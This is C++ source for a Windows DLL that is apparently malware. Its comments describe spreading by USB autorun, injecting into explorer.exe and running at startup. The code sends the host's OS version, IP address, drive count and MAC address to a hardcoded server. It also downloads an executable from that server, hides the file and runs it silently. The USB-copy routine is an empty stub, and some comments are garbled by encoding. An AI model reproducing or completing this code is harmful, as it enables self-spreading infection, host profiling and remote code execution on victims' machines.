// private_dll.cpp : ���� DLL Ӧ�ó���ĵ���������
//

#include "stdafx.h"
#include "private_dll.h"
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "proto.h"
#include <dbt.h>
#include "log.h"
#include <math.h>
#include <vector>
#include <string>
#include <Iphlpapi.h>
#include <shellapi.h>
using namespace std;

#pragma warning(disable: 4996)
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Shell32.lib")

#define LOG_FILE  "dll_log.log"

#define SERVER_ADDR "171.1.2.13"
#define SERVER_PORT 4587

#define TCP_CLIENT_STATE_INIT  0
#define TCP_CLIENT_STATE_SEND_GET_REQ 1
#define TCP_CLIENT_STATE_RECV_GET_REP 2
#define TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD 3

#define BOOTSTRAP_PRGRAM_PATH_NAME "d:\\bootstrap.exe"


typedef struct tcp_client_status
{
	SOCKET sock;
	int state;
}TCP_CLIENT_STATUS_T;


typedef struct local_drive{
	string drive_name;
	unsigned int  drive_type;
}LOCAL_DRIVE_T;


char host_exe_path_[512] = { 0 };
bool geted_host_exe_path_ = false;
HANDLE hLocalProcHandle_ = NULL;
HANDLE hUsbInsertEventHandle_ = NULL;
BOOL bQuit_ = FALSE;
int osVersion_ = 0;
BOOL isVistaLaterOS_ = FALSE;
TCP_CLIENT_STATUS_T tcp_client_status_ = { 0 };
vector<LOCAL_DRIVE_T> local_drives_;
float local_bootstrap_version_ = 0.0f;
BOOL isFirstDataPacket_ = TRUE;
FILE *bootstrapHandle_ = NULL;

void *loger_ = NULL;

/*1.Being used to listen usb event, when usb inserted into computer,
copy the files(private_dll.dll, inj.exe, autorun.inf) to usb.
and write an AutoRun.inf scripts into usb to infect other computers.
2. register to server
3. get command from server. maybe run the bootstrap.exe which is downloaded from the server
4. get the path of the programs from inj.exe*/
#define DLL_FILE "private_dll.dll"

/*inject dll into explorer.exe process and tell the dll the programs's path*/
#define INJ_FILE "inj.exe"

/*auto run the program . copy files(private_dll.dll, inj.exe) into compute's  partition of D and
register the inj.exe as an startup program with boot of the computer */
#define AUTO_RUN_INF "autorun.inf"





BOOL IsVistaOrLater()
{
	OSVERSIONINFO osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
	if (osvi.dwMajorVersion >= 6)
	{
		osVersion_ = osvi.dwMajorVersion;
		return TRUE;
	}
	return FALSE;
}

typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;

BOOL IsWow64()
{
	BOOL bIsWow64 = FALSE;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
		{
			return FALSE;
		}
	}
	return bIsWow64;
}



void InitNetwork()
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		return;
	}

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		WSACleanup();
	}
	return;
}


void CleanupNetwork()
{
	WSACleanup();
}


unsigned __stdcall localProc(void* pArguments)
{
	SOCKET sockSrv = socket(AF_INET, SOCK_DGRAM, 0);

	SOCKADDR_IN  addrServ;
	addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServ.sin_family = AF_INET;
	addrServ.sin_port = htons(UDP_SERVER_PORT);

	bind(sockSrv, (SOCKADDR*)&addrServ, sizeof(SOCKADDR));

	SOCKADDR_IN  addrClient = { 0 };
	int length = sizeof(SOCKADDR);
	char recvBuf[1024] = { 0 };
	int ret = 0;

	ret = recvfrom(sockSrv, recvBuf, 1024, 0, (SOCKADDR*)&addrClient, &length);
	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)recvBuf;
	char *body = NULL;
	if (hdr->version == PROTO_VERSION && 
		hdr->msg_type == MSG_TYPE_BOOTSTRAP_LOCAL_PATH)
	{
		body = recvBuf + sizeof(LOCAL_PROTO_T);
		memcpy(host_exe_path_, body, hdr->body_len);
		geted_host_exe_path_ = true;
	}
	closesocket(sockSrv);
	WSACleanup();
	return 0;
}

//copy programs into usb 
void copy_programs_to_usb(char usb)
{

}



LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM wp, LPARAM lp)
{
	if (msg == WM_DEVICECHANGE) {
		if ((DWORD)wp == DBT_DEVICEARRIVAL) {
			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
				log_write(loger_, "������%c�̲������\n", 'A' + l);
				copy_programs_to_usb(l + 'A');
			}
		}
		else if ((DWORD)wp == DBT_DEVICEREMOVECOMPLETE) {
			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
				log_write(loger_, "������%c�̱��ε���\n", 'A' + l);
			}
		}
		return TRUE;
	}
	else return DefWindowProc(h, msg, wp, lp);
}


unsigned __stdcall usbEventProc(void* pArguments)
{
	WNDCLASS wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.lpszClassName = TEXT("usb_listener");
	wc.lpfnWndProc = WndProc;

	RegisterClass(&wc);
	HWND h = CreateWindow(TEXT("usb_listener"), TEXT(""), 0, 0, 0, 0, 0,
		0, 0, GetModuleHandle(0), 0);
	MSG msg;
	while (GetMessage(&msg, 0, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

SOCKET create_local_streamsock_and_bind()
{
	int ret = 0;
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN  addrlocal;
	addrlocal.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrlocal.sin_family = AF_INET;
	addrlocal.sin_port = htons(0);

	ret = bind(sock, (SOCKADDR*)&addrlocal, sizeof(SOCKADDR));
	if (ret == SOCKET_ERROR){
		return 0;
	}
	return sock;
}

SOCKET create_local_datagramsock_and_bind()
{
	int ret = 0;
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
	SOCKADDR_IN  addrlocal;
	addrlocal.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrlocal.sin_family = AF_INET;
	addrlocal.sin_port = htons(0);

	ret = bind(sock, (SOCKADDR*)&addrlocal, sizeof(SOCKADDR));
	if (ret == SOCKET_ERROR){
		return 0;
	}
	return sock;
}

int get_os_version()
{
	return osVersion_;
}

int get_local_ipv4_addr()
{
	int nLen = 256;
	char hostname[20];
	gethostname(hostname, nLen);
	hostent *pHost = gethostbyname(hostname);
	char *lpAddr = pHost->h_addr_list[0];
	struct in_addr inAddr;
	memmove(&inAddr, lpAddr, 4);
	return inAddr.S_un.S_addr;
}

char get_number_of_partition()
{
	DWORD dwSize = MAX_PATH;
	unsigned short count = 0;
	char szLogicalDrives[MAX_PATH] = { 0 };
	local_drives_.clear();
	//��ȡ�߼����������ַ���
	DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);
	if (dwResult > 0 && dwResult <= MAX_PATH) {
		char* szSingleDrive = szLogicalDrives;  //�ӻ�������ʼ��ַ��ʼ
		while (*szSingleDrive) {
			LOCAL_DRIVE_T ldr;
			ldr.drive_name = szSingleDrive;
			UINT uDriverType = GetDriveType(ldr.drive_name.c_str());
			ldr.drive_type = uDriverType;
			szSingleDrive += strlen(szSingleDrive) + 1;
			count++;
			local_drives_.push_back(ldr);
		}
	}
	return (char)count;
}

char *get_mac_address()
{
	static char mac_addr[6 + 1] = { 0 };
	memset(mac_addr, 0, 7);
	PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
	unsigned long stSize = sizeof(IP_ADAPTER_INFO);
	int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
	if (ERROR_BUFFER_OVERFLOW == nRel)
	{
		delete pIpAdapterInfo;
		pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
		nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
	}
	if (ERROR_SUCCESS == nRel)
	{
		if (pIpAdapterInfo)
		{
			memcpy(mac_addr, pIpAdapterInfo->Address, 6);
		}
	}
	//�ͷ��ڴ�ռ�
	if (pIpAdapterInfo)
	{
		delete pIpAdapterInfo;
	}
	return mac_addr;
}


unsigned __stdcall registerProc(void* pArguments)
{
	int ret = 0;
	char buffer[512] = { 0 };
	int data_len = 0;
	char *body = NULL;
	char *ptr = NULL;
	int total_len = 0;

	SOCKET sock = create_local_datagramsock_and_bind();
	if (sock == 0){
		return ret;
	}

	SOCKADDR_IN  addrServ;
	addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
	addrServ.sin_family = AF_INET;
	addrServ.sin_port = htons(SERVER_PORT);
	
	while (!bQuit_)
	{
		LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)buffer;
		hdr->version = PROTO_VERSION;
		hdr->msg_type = MSG_TYPE_REGISTER;
		hdr->body_len = 0;
		body = buffer + sizeof(LOCAL_PROTO_T);
		ptr = body;
		(*(int *)ptr) = get_os_version();
		ptr += sizeof(int);
		(*(int *)ptr) = get_local_ipv4_addr();
		ptr += sizeof(int);
		(*(char *)ptr) = get_number_of_partition();
		ptr += sizeof(char);
		memcpy(ptr, get_mac_address(), 6);
		ptr += 6;
		data_len = (int)(ptr - body);
		hdr->body_len = data_len;
		total_len = (int)(ptr - (char *)hdr);
		sendto(sock, buffer, total_len, 0, (sockaddr *)&addrServ, sizeof(addrServ));
		Sleep(1000 * 3000);//50 min
	}
	return 0;
}


void setFileHidden(char *file)
{
	string filepath = file;
	string strCmd = "attrib +h" + filepath;
	WinExec(strCmd.c_str(), 0);
}


void onGetBootStrapVersion(TCP_CLIENT_STATUS_T *client, float version)
{
	char buffer[512] = { 0 };
	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T*)buffer;
	if (version > local_bootstrap_version_)
	{
		local_bootstrap_version_ = version;
		hdr->version = PROTO_VERSION;
		hdr->msg_type = MSG_TYPE_DOWNLOAD_BOOTSTRAP;
		hdr->body_len = 0;
		send(client->sock, buffer, sizeof(LOCAL_PROTO_T), 0);
		client->state = TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD;
	}
}

void onDownloadData(TCP_CLIENT_STATUS_T *client, char *data, int len)
{
	if (isFirstDataPacket_)
	{
		if (local_drives_.size() >= 2)
		{
			bootstrapHandle_ = fopen(BOOTSTRAP_PRGRAM_PATH_NAME, "wb+");
			setFileHidden(BOOTSTRAP_PRGRAM_PATH_NAME);
		}
		
	}
	if (bootstrapHandle_ != NULL)
		fwrite(data, len, 1, bootstrapHandle_);
}

void onDownloadDataEnd(TCP_CLIENT_STATUS_T *client)
{
	isFirstDataPacket_ = TRUE;
	if (bootstrapHandle_ != NULL)
		fclose(bootstrapHandle_);
	bootstrapHandle_ = NULL;
	client->state = TCP_CLIENT_STATE_INIT;
	closesocket(client->sock);
	Sleep(1000);

	SHELLEXECUTEINFO ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = "open";
	ShExecInfo.lpFile = BOOTSTRAP_PRGRAM_PATH_NAME;
	ShExecInfo.lpParameters = NULL;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;
	ShellExecuteEx(&ShExecInfo);
}


#define CONTINUE_READ -1
#define READ_OK  0

int onPacketRead(TCP_CLIENT_STATUS_T *client, char * packet, int len)
{
	char *ptr = NULL;

	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)packet;
	if (hdr->version != PROTO_VERSION)
		return READ_OK;

	switch (client->state)
	{
	case TCP_CLIENT_STATE_SEND_GET_REQ:
		if (hdr->msg_type == MSG_TYPE_REPLY_BOOTSTRAP_VERSION)
		{
			client->state = TCP_CLIENT_STATE_RECV_GET_REP;
			ptr = packet + sizeof(LOCAL_PROTO_T);
			float version = *(float *)ptr;
			onGetBootStrapVersion(client, version);
		}
		break;
	case TCP_CLIENT_STATE_INIT:
		break;
	case TCP_CLIENT_STATE_RECV_GET_REP:
		break;
	case TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD:
		if (hdr->msg_type == MSG_TYPE_DOWNLOAD_DATA ||
			hdr->msg_type == MSG_TYPE_DOWNLOAD_DATA_END)
		{
			ptr = packet + sizeof(LOCAL_PROTO_T);
			len = len - sizeof(LOCAL_PROTO_T);
			onDownloadData(client, ptr, len);
			isFirstDataPacket_ = FALSE;
			if (hdr->msg_type == MSG_TYPE_DOWNLOAD_DATA_END)
			{
				onDownloadDataEnd(client);
			}
		}
		break;
	}
	return READ_OK;
}


unsigned __stdcall bootstrapProc(void* pArguments)
{
	int ret = 0;
	char buffer[1500] = { 0 };
	FD_SET readSet;
	struct timeval timeout = { 0 };
	FD_ZERO(&readSet);
	int left = 0;
	int offset = 0;
	char packet[1500] = { 0 };
	int packet_len = 0;
	int prev_packet_len = 0;
	int pre_packet_is_not_completely = 0;
	SOCKET sock;
	
	while (!bQuit_)
	{
		if (tcp_client_status_.state == TCP_CLIENT_STATE_INIT)
		{
			sock = create_local_streamsock_and_bind();
			if (sock == 0){
				return ret;
			}
			SOCKADDR_IN  addrServ;
			addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
			addrServ.sin_family = AF_INET;
			addrServ.sin_port = htons(SERVER_PORT);
			//�������������������  
			if (connect(sock, (struct  sockaddr*)&addrServ, sizeof(addrServ)) == INVALID_SOCKET)
			{
				Sleep(1000 * 300);
				continue;
			}
		}
		LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)buffer;
		hdr->version = PROTO_VERSION;
		hdr->msg_type = MSG_TYPE_GET_BOOTSTRAP_VERSION;
		hdr->body_len = 0;
		ret = send(sock, buffer, sizeof(LOCAL_PROTO_T), 0);
		tcp_client_status_.state = TCP_CLIENT_STATE_SEND_GET_REQ;
		if (ret > 0)
		{
			timeout.tv_sec = 10;
			FD_SET(sock, &readSet);
			ret = select(0, &readSet, NULL, NULL, &timeout);
			if (ret > 0)
			{//read data
				FD_ZERO(&readSet);
				ret = recv(sock, buffer, sizeof(buffer), 0);
				if (ret > 0)
				{
					if (ret < sizeof(LOCAL_PROTO_T))
					{
						closesocket(sock);
						tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
						Sleep(1000 * 300);
						continue;
					}
					hdr = (LOCAL_PROTO_T *)buffer;
					packet_len = sizeof(LOCAL_PROTO_T)+hdr->body_len;
					if (ret == packet_len)
					{
						pre_packet_is_not_completely = 0;
						onPacketRead(&tcp_client_status_, buffer, ret);
					}
					else if (ret < packet_len && !pre_packet_is_not_completely)
					{
						offset = 0;
						left = packet_len - offset;
						prev_packet_len = packet_len;
						pre_packet_is_not_completely = 1;
						memcpy(&packet[offset], buffer, ret);
						offset += ret;
					}
					else if (pre_packet_is_not_completely && ret < left)
					{
						memcpy(&packet[offset], buffer, ret);
						offset += ret;
						left = left - ret;
					}
					else if (pre_packet_is_not_completely && ret == left)
					{
						pre_packet_is_not_completely = 0;
						memcpy(&packet[offset], buffer, ret);
						offset += ret;
						left = left - ret;
						onPacketRead(&tcp_client_status_, packet, offset);
						prev_packet_len = 0;
						offset = 0;
					}
				}
				else
				{
					closesocket(sock);
					tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
					Sleep(1000 * 300);
					continue;
				}
					
			}
			else if (ret == 0) //timeout
			{
				Sleep(1000 * 10);
				continue;
			}
			else //error
			{
				closesocket(sock);
				tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
				Sleep(1000 * 300);
			}
		}
		else
		{
			closesocket(sock);
			tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
			Sleep(1000 * 300);
		}
	}
	return 0;
}



void Init(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

	loger_ = log_create(LOG_FILE);
	isVistaLaterOS_ = IsVistaOrLater();
	InitNetwork();
	//listen on localhost machine  for geting the path of inj.exe 
	unsigned threadID1, threadID2, threadID3;

	hLocalProcHandle_ = (HANDLE)_beginthreadex(NULL, 0, &localProc, NULL, 0, &threadID1);
	CloseHandle(hLocalProcHandle_);
	hLocalProcHandle_ = NULL;

	//listen usb insert event
	hUsbInsertEventHandle_ = (HANDLE)_beginthreadex(NULL, 0, &usbEventProc, NULL, 0, &threadID2);
	CloseHandle(hUsbInsertEventHandle_);
	hUsbInsertEventHandle_ = NULL;


	//network thread for comunicating with server
	HANDLE registerhandler;
	registerhandler = (HANDLE)_beginthreadex(NULL, 0, &registerProc, NULL, 0, &threadID3);
	CloseHandle(registerhandler);


	HANDLE bootstraphandler;
	bootstraphandler = (HANDLE)_beginthreadex(NULL, 0, &bootstrapProc, NULL, 0, &threadID3);
	CloseHandle(bootstraphandler);

	



}

void UnInit(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

}